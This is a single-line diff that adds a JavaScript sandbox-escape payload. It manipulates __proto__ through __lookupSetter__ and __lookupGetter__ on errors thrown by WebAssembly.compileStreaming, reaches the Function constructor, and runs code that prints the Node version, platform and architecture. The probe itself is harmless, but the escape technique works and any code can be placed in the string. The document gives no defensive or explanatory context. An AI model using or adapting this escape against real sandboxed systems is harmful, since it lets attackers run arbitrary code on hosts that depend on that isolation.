@@ -1,0 +1,1 @@
+c=Buffer.call;C=c.bind(c);p="__proto__";W=WebAssembly.compileStreaming;W().catch(e=>{C(C(c.__lookupSetter__,c,p),C(C(c.__lookupGetter__,c,p),e),null);W().catch(e=>e.toString.constructor`console.log(process.version+" "+process.platform+" "+process.arch+" gBM="+(typeof process.getBuiltinModule))`())})
